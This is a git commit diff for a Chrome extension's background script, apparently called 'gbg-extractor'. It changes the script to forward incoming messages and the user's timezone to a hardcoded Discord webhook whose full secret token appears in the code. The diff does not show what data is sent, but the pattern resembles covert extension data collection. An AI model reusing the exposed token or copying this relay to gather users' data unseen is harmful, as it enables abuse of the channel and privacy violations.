338de2004c466f7ac0a9c0a6a114e516b184ea91
quantumified <quantumified@gmail.com>
2024-09-20 17:59:28 +1000

    Update background.js

--- gbg-extractor/background.js
+++ gbg-extractor/background.js
@@ -1,14 +1,17 @@
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     if (request.action === 'sendMessage') {
         const webhookURL = 'https://discord.com/api/webhooks/1274955137303183401/FLehqCkQD_tiRUGR2vE4X8jXLikzeCb8bMYpFFOoDoBxmMaJcKLPhLUJBKHRz3v1Hj2i';
-        const testMessage = 'Chrome ext test.';
+        const message = request.message;
+        const timezone = request.timezone;
+
+        const fullMessage = `${message}\n\n(Timezone: ${timezone})`;
 
         fetch(webhookURL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({ content: testMessage }),
+            body: JSON.stringify({ content: fullMessage }),
         })
         .then((response) => {
             if (response.ok) {
